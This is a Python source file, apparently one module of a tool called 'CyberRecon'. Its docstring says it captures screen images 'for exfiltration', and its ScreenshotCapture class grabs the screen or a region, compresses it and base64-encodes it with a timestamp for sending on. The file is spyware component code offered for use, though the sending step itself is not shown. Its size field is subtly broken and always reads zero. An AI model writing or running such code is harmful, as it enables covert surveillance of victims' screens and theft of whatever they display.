"""
CyberRecon Screenshot Module
Captures screen images for exfiltration.
"""

import base64
from io import BytesIO
from datetime import datetime

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


class ScreenshotCapture:
    def __init__(self, quality=85, format="JPEG"):
        self.quality = quality
        self.format = format

    def capture(self, region=None):
        if not PYAUTOGUI_AVAILABLE or not PIL_AVAILABLE:
            return None
        try:
            if region:
                img = pyautogui.screenshot(region=region)
            else:
                img = pyautogui.screenshot()
            buf = BytesIO()
            img.save(buf, format=self.format, quality=self.quality, optimize=True)
            buf.seek(0)
            return {
                "timestamp": datetime.now().isoformat(),
                "format": self.format,
                "size": buf.tell(),
                "data": base64.b64encode(buf.getvalue()).decode(),
                "region": region
            }
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
            return None
